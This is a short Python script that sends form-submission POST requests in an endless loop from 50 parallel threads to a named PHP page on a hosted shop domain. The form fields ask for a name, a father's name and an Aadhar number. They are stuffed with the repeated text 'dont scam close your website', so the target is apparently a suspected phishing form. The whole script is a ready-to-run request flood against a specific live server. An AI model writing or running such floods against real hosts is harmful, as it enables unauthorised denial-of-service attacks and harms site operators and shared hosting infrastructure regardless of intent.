import requests
import threading

url = "https://prestashop-179074-0.cloudclusters.net/9th.php"
data = {
    "Full_Name": "dont scam close your website dont scam close your website dont scam close your website dont scam close your website dont scam close your website",
    "Aadhar_No.": "6969",
    "Father's_Name": "dont scam close your website dont scam close your website dont scam close your website dont scam close your website ",
}

def doreq():
    while True:
        response = requests.post(url, data=data)
        print(response)


threads = []
for i in range(50):
    t = threading.Thread(target=doreq)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()

